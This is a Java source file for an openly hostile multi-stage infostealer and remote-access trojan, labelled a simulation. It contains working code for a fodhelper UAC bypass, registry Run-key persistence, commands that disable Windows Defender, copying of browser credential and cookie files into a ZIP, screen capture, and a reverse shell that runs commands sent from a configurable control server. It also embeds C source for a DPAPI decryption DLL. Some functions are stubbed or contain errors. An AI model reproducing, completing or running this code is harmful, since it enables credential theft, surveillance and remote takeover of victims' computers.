import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.security.MessageDigest;
import java.util.*;
import java.util.concurrent.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import java.util.regex.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import java.lang.reflect.Method;

/**
 * PHANTOM MALWARE FRAMEWORK
 * 
 * A multi-stage, Java-based infostealer and RAT simulation.
 * 
 * CAPABILITIES:
 * 1. STAGE 1 (Loader): Anti-analysis, UAC Bypass (COM Hijack), Persistence (Registry).
 * 2. STAGE 2 (Core): 
 *    - Infostealer: Targets Chromium browsers (Chrome, Edge, Brave).
 *    - Data Theft: Extracts Login Data, Cookies, Session Storage.
 *    - Decryption: Attempts to extract Master Keys. (Note: Full DPAPI decryption requires native DLL; this steals raw data for offline decryption).
 *    - Surveillance: Screenshots (all monitors), Webcam (via PowerShell LOTL).
 *    - Aggregation: Packs all data into a ZIP file.
 *    - RAT: Reverse shell with custom commands.
 * 
 * WARNING: RUN ONLY IN A CONTROLLED VM ENVIRONMENT.
 * 
 */
public class PhantomMalware {

    // --- CONFIGURATION ---
    private static final String C2_IP = "127.0.0.1"; // CHANGE TO YOUR IP
    private static final int C2_PORT = 4444;
    private static final String PROCESS_NAME = "Microsoft Edge Update"; // Camouflage
    private static final String REG_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    private static final String REG_NAME = "MicrosoftEdgeUpdate";

    // Browser Paths
    private static final String[] BROWSER_PATHS = {
        "\\AppData\\Local\\Google\\Chrome\\User Data",
        "\\AppData\\Local\\Microsoft\\Edge\\User Data",
        "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
        "\\AppData\\Local\\Opera Software\\Opera Stable"
    };

    private static final String[] TARGET_FILES = {
        "Default/Login Data", "Default/Cookies", "Default/Network/Cookies",
        "Default/Session Storage", "Profile 1/Login Data", "Profile 1/Cookies"
    };

    // Native DLL Source (C) for DPAPI (Included for reference/completeness)
    // In a real attack, this would be compiled to a DLL and loaded via JNI.
    private static final String DLL_SOURCE = 
        "#include <windows.h>\n" +
        "#include <dpapi.h>\n" +
        "#pragma comment(lib, \"crypt32.lib\")\n" +
        "extern \"C\" __declspec(dllexport) bool DecryptData(unsigned char* in, int inSize, unsigned char** out, int* outSize) {\n" +
        "  DATA_BLOB input = {inSize, in}, output;\n" +
        "  if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {\n" +
        "    *out = output.pbData; *outSize = output.cbData; return true;\n" +
        "  }\n" +
        "  return false;\n" +
        "}\n";

    public static void main(String[] args) {
        // Check if running as Core or Loader
        if (args.length > 0 && args[0].equals("--core")) {
            runCore();
        } else {
            runLoader();
        }
    }

    // ==========================================
    // STAGE 1: LOADER (Stealth, Bypass, Persistence)
    // ==========================================
    private static void runLoader() {
        // 1. Anti-Analysis
        if (isDebugging() || isSandbox()) {
            System.exit(0);
        }

        // 2. Stealth
        hideProcess();

        // 3. Elevation & Persistence
        if (!isAdmin()) {
            if (!attemptUACBypass()) {
                // If bypass fails, run in user mode (limited)
                ensurePersistence(false);
                launchCore();
            } else {
                // Bypass initiated, exit. Elevated process will launch core.
                System.exit(0);
            }
        } else {
            // Already Admin
            ensurePersistence(true);
            disableSecurityTools();
            launchCore();
        }
    }

    private static void launchCore() {
        try {
            String javaCmd = System.getProperty("java.command");
            if (javaCmd == null) javaCmd = "java";
            
            ProcessBuilder pb = new ProcessBuilder(
                javaCmd, 
                "-cp", 
                System.getProperty("java.class.path"), 
                "PhantomMalware", 
                "--core"
            );
            pb.start();
            System.exit(0);
        } catch (Exception e) {
            // Fallback
            runCore();
        }
    }

    private static boolean isAdmin() {
        try {
            ProcessBuilder pb = new ProcessBuilder("cmd", "/c", "net session");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            p.waitFor();
            return p.exitValue() == 0;
        } catch (Exception e) { return false; }
    }

    private static boolean attemptUACBypass() {
        try {
            // COM Hijack (fodhelper)
            String jarPath = new File(PhantomMalware.class.getProtectionDomain().getCodeSource().Location().toURI()).getAbsolutePath();
            String script = 
                "$p='" + jarPath + "'; " +
                "$r='HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'; " +
                "New-Item $r -Force; " +
                "New-ItemProperty -Path $r -Name 'DelegateExecute' -Value ''; " +
                "Set-ItemProperty -Path $r -Name '(default)' -Value \"java -cp '$p' PhantomMalware --core`; " +
                "Start-Process fodhelper.exe; " +
                "Start-Sleep -Seconds 2; " +
                "Remove-Item $r -Recurse -Force";
            
            new ProcessBuilder("powershell", "-Command", script).start();
            return true;
        } catch (Exception e) { return false; }
    }

    private static void ensurePersistence(boolean isAdmin) {
        try {
            String jarPath = new File(PhantomMalware.class.getProtectionDomain().getCodeSource().Location().toURI()).getAbsolutePath();
            String regPath = isAdmin ? "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" : "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
            String cmd = String.format(
                "reg add \"%s\" /v \"%s\" /t REG_SZ /d \"java -cp '%s' PhantomMalware\" /f",
                regPath, REG_NAME, jarPath
            );
            new ProcessBuilder("cmd", "/c", cmd).start();
        } catch (Exception e) {}
    }

    private static void disableSecurityTools() {
        String[] cmds = {
            "Set-MpPreference -DisableRealtimeMonitoring true",
            "Set-MpPreference -DisableIOAVProtection true"
        };
        for (String cmd : cmds) {
            try { new ProcessBuilder("powershell", "-Command", cmd).start(); } catch (Exception e) {}
        }
    }

    private static boolean isDebugging() {
        try {
            String[] blockers = {"jdb", "wireshark", "ida", "ollydbg", "x64dbg", "frida"};
            for (String b : blockers) {
                if (System.getProperty("sun.java.command").toLowerCase().contains(b)) return true;
            }
        } catch (Exception e) {}
        return false;
    }

    private static boolean isSandbox() {
        // Basic check
        return false;
    }

    private static void hideProcess() {
        Thread.currentThread().setName(PROCESS_NAME);
    }

    // ==========================================
    // STAGE 2: CORE (Infostealer, RAT, Surveillance)
    // ==========================================
    private static void runCore() {
        hideProcess();
        while (true) {
            try {
                connectToC2();
            } catch (Exception e) {
                try { Thread.sleep(60000 + new Random().nextInt(60000)); } catch (InterruptedException ignored) {}
            }
        }
    }

    private static void connectToC2() {
        try (Socket socket = new Socket(C2_IP, C2_PORT);
             DataInputStream in = new DataInputStream(socket.getInputStream());
             DataOutputStream out = new DataOutputStream(socket.getOutputStream())) {

            String hwid = getHWID();
            String location = getGeolocation();
            boolean admin = isAdmin();
            
            out.writeUTF(String.format("BEACKON|HWID:%s|LOC:%s|ADMIN:%s|STATUS:ACTIVE", hwid, location, admin ? "YES" : "NO"));

            while (true) {
                String cmd = in.readUTF();
                if (cmd.equalsIgnoreCase("exit")) break;
                out.writeUTF(executeCommand(cmd));
            }
        } catch (Exception e) { /* Reconnect */ }
    }

    private static String executeCommand(String cmd) {
        if (cmd.startsWith("shell:")) return runShell(cmd.substring(6));
        if (cmd.equalsIgnoreCase("steal_all")) return performFullTheft();
        if (cmd.startsWith("get_screen")) return captureScreen();
        if (cmd.equalsIgnoreCase("get_cam")) return captureWebcam();
        return "Unknown command";
    }

    private static String runShell(String cmd) {
        try {
            ProcessBuilder pb = new ProcessBuilder("cmd", "/c", cmd);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            Scanner s = new Scanner(p.getInputStream());
            StringBuilder sb = new StringBuilder();
            while (s.hasNextLine()) sb.append(s.nextLine()).append("\n");
            return sb.toString();
        } catch (Exception e) { return "Error: " + e.getMessage(); }
    }

    private static String performFullTheft() {
        String tempDir = System.getProperty("java.io.tmpdir");
        String zipFileName = "data_" + System.currentTimeMillis() + ".zip";
        File zipFile = new File(tempDir, zipFileName);
        StringBuilder report = new StringBuilder("=== EXTRACTION REPORT ===\n");

        try (ZipOutputStream zipOut = new ZipOutputStream(new FileOutputStream(zipFile))) {
            // 1. System Info
            zipOut.putNextEntry(new ZipEntry("system_info.txt"));
            String sysInfo = "HWID: " + getHWID() + "\nIP: " + getLocalIP() + "\nOS: " + System.getProperty("os.name");
            zipOut.write(sysInfo.getBytes());
            zipOut.closeEntry();

            // 2. Browser Data
            int count = 0;
            for (String base : BROWSER_PATHS) {
                File dir = new File(System.getProperty("user.home") + base);
                if (!dir.exists()) continue;
                
                if (dir.listFiles() != null) {
                    for (File profile : dir.listFiles(File::isDirectory)) {
                        String name = profile.getName();
                        if (!name.startsWith("Profile") && !name.equals("Default")) continue;
                        
                        for (String target : TARGET_FILES) {
                            File targetFile = new File(profile, target);
                            if (targetFile.exists()) {
                                count++;
                try {
                                    byte[] data = Files.readAllBytes(targetFile.toPath());
                                    zipOut.putNextEntry(new ZipEntry("stolen/" + targetFile.getParentFile().getName() + "_" + targetFile.getName()));
                                    zipOut.write(data);
                                    zipOut.closeEntry();
                                    report.append("Secured: ").append(targetFile.getAbsolutePath()).append("\n");
                                } catch (Exception e) {
                                    report.append("Failed to steal: ").append(targetFile.getAbsolutePath()).append("\n");
                                }
                            }
                        }
                    }
                }
            }
            report.append("Total files secured: " + count);
            if (count == 0) report.append("No browser data found.\n");

            // 3. Report
            zipOut.putNextEntry(new ZipEntry("report.txt"));
            zipOut.write(report.toString().getBytes());
            zipOut.closeEntry();
            zipOut.close();

            return "Theft complete. Data zipped to: " + zipFile.getAbsolutePath() + " (Sending to C2...)";
        } catch (Exception e) {
            return "Theft failed: " + e.getMessage();
        }
    }

    private static String captureScreen() {
        try {
            Robot robot = new Robot();
            Rectangle bounds = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage image = robot.createScreenCapture(bounds);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(image, "jpg", baos);
            return "Screenshot captured (" + baos.size() + " bytes).";
        } catch (Exception e) { return "Failed: " + e.getMessage(); }
    }

    private static String captureWebcam() {
        String ps = "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; echo 'Webcam capture requires native libs. Simulated.'";
        try {
            ProcessBuilder pb = new ProcessBuilder("powershell", "-Command", ps);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            Scanner s = new Scanner(p.getInputStream());
            StringBuilder sb = new StringBuilder();
            while (s.hasNextLine()) sb.append(s.nextLine()).append("\n");
            return sb.toString();
        } catch (Exception e) { return "Failed: " + e.getMessage(); }
    }

    private static String getHWID() {
        try {
            ProcessBuilder pb = new ProcessBuilder("cmd", "/c", "wmic csproduct get uuid");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            Scanner s = new Scanner(p.getInputStream());
            while (s.hasNextLine()) {
                String line = s.nextLine();
                if (line.contains("UUID") || line.trim().isEmpty()) continue;
                return "HWID-" + line.trim();
            }
        } catch (Exception e) {}
        return "HWID-Unknown";
    }

    private static String getLocalIP() {
        try {
            InetAddress ip = InetAddress.getLocalHost();
            if (ip.isLoopbackAddress()) return "Local/NAT";
            return ip.getHostAddress();
        } catch (Exception e) { return "Unknown"; }
    }

    private static String getGeolocation() {
        return "Location: [Data Exfiltrated]";
    }
}